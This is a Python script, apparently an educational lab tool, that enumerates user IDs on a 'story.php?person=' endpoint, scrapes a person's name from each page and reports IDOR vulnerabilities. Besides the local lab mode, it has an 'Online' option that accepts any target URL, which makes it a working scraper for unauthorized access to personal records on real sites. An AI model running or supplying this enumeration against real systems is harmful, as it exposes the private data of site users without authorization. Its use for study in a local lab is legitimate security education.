import requests
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)


def scan_local_lab(start_id, end_id):
    print(f"{Fore.RED}Author: Eugene Zavirukha...")
    print(f"{Fore.RED}Date of creating: 14.03.2026\n[!] Created for EDUCATION PURPOSES only [!]\n")

    print(f"1. Local\n2. Online")

    BASE_URL = ""
    while not BASE_URL:
        choosing_environment = input(": ").strip()

        if choosing_environment == "1":
            BASE_URL = "http://127.0.0.1:5000/story.php?person="
            print(f"{Fore.CYAN}Running a local environment audit...\n")

        elif choosing_environment == "2":
            USER_URl = input(f"{Fore.YELLOW}Enter target URL (e.g., http://site.com/story.php?person=): ").strip()

            if USER_URl.startswith("http"):
                BASE_URL = USER_URl
                print(f"{Fore.CYAN}Running an online environment audit...\n")

            else:
                print(f"{Fore.RED}[!] Error: URL must start with http:// or https://")
        else:
            print(f"{Fore.RED}[!] Invalid choice.")

    # Main scan cycle
    for uid in range(start_id, end_id + 1):
        try:
            # *timeout
            res = requests.get(f"{BASE_URL}{uid}", timeout=5)

            if res.status_code == 200:
                soup = BeautifulSoup(res.text, 'html.parser')
                # Tag of the element
                name_tag = soup.find('span', style="margin-left:2px;")
                name = name_tag.get_text(strip=True) if name_tag else ""

                if name:
                    print(f"{Fore.GREEN}[+] Vulnerability IDOR confirmed! ID {uid}: {name}")

                else:
                    print(f"{Fore.WHITE}[.] ID {uid}: Page is empty or data not found.")

            elif res.status_code == 404:
                print(f"{Fore.YELLOW}[-] ID {uid}: 404 Not Found.")

            else:
                print(f"{Fore.YELLOW}[?] ID {uid}: Received status code {res.status_code}")

        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}\n[!] Connection Error. Check if the server is running.")
            break

        except requests.exceptions.Timeout:
            print(f"{Fore.RED}\n[!] Request Timeout at ID {uid}.")
            continue

        except Exception as e:
            print(f"{Fore.RED}\n[!] An unexpected error occurred: {e}")
            break

if __name__ == "__main__":
    scan_local_lab(1, 10)  # Test ID 1 - 10
